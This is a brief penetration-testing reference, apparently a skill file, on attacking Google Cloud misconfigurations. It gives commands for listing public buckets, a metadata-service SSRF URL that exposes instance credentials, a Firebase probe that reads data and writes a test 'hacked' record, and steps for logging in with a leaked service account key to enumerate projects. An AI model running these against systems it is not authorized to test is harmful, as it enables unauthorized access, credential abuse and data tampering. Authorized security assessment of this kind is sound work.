# SKILL: GCP Cloud Misconfiguration
## Version: 1.0 | Domain: infra

---

## TOP FINDINGS
### Public Cloud Storage bucket
```bash
curl https://storage.googleapis.com/BUCKET_NAME/
gsutil ls gs://BUCKET_NAME
```

### Metadata SSRF
```
http://metadata.google.internal/computeMetadata/v1/?recursive=true
# Requires: Metadata-Flavor: Google header
```

### Firebase misconfig
```bash
curl https://PROJECT.firebaseio.com/.json
# If returns data → open read
# Test write:
curl -X PUT https://PROJECT.firebaseio.com/test.json -d '{"hacked":true}'
```

### Service account key leak
```bash
# Found in GitHub / APK
gcloud auth activate-service-account --key-file=leaked-key.json
gcloud projects list
gcloud compute instances list
```

## TOOLS
- scoutsuite, gcp-firewall-enum, gcp_enum

## REFERENCES
GCP Security Best Practices
